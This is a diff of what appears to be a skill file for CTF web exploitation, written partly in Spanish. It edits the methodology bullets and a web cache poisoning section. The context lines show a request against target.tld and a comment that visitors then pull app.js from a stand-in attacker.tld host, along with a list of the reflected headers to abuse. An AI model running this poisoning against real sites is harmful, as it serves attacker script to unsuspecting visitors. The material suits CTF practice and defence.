@@ -40,7 +40,7 @@ Sigue los pasos y referencias del contenido base de esta habilidad.
 - Objetivo inicial: confirmar una primitiva web pequeña (read, bypass o SSRF interno) antes de cadenas largas.
 - Orden recomendado: recon de superficie -> validacion de input sink -> PoC minimo -> escalado.
 - Tiempo maximo por hipotesis: 10-15 minutos; si no hay señal, pivota a otro bug family.
-- Salida minima util: request reproducible (raw curl/Burp headless (sin GUI)), respuesta esperada y condicion de exito.
+- Salida minima util: request reproducible (raw curl/mitmdump), respuesta esperada y condicion de exito.
 
 ## Contenido base
 
@@ -164,7 +164,7 @@ requests.get("https://target.tld/cdn/app.js",
 # Within the 120s TTL any visitor pulls https://attacker.tld/cdn/app.js
 ```
 
-**Key insight:** Cache keys rarely include request headers, even when those headers feed the response body. Any header the backend reflects into HTML (`Host`, `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL`, `Forwarded`) becomes a web cache poisoning vector the moment the response is cached. Use `Vary: X-Forwarded-Host` or strip these headers at the edge; attackers hunt them with Burp Param Miner (`unkeyed header discovery`).
+**Key insight:** Cache keys rarely include request headers, even when those headers feed the response body. Any header the backend reflects into HTML (`Host`, `X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL`, `Forwarded`) becomes a web cache poisoning vector the moment the response is cached. Use `Vary: X-Forwarded-Host` or strip these headers at the edge; attackers hunt them with fuzzing reproducible de headers (`unkeyed header discovery`).
 
 **References:** CSAW CTF Qualification Round 2018 — Hacker Movie Club, writeup 11277
 
